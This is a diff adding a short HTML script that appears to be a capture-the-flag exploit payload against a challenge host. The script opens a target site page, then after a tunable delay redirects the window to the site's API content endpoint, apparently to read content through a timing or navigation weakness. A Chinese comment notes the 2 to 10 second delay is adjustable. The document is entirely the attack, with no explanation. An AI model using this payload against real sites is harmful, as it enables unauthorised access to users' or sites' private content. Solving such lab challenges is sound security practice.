@@ -1,0 +1,8 @@
+<script>
+const T = "http://chal.polyuctf.com:43363/";
+const SID = "8e43c181e7c1f23ac7f1cb52dda8091c579331607c1faff63d3ef5231c0cb191";
+const w = window.open(`${T}/sites/${SID}`);
+setTimeout(() => {
+  w.location = `${T}/api/sites/${SID}/content`;
+}, 4000); // 這個時間可調 2~10 秒
+</script>
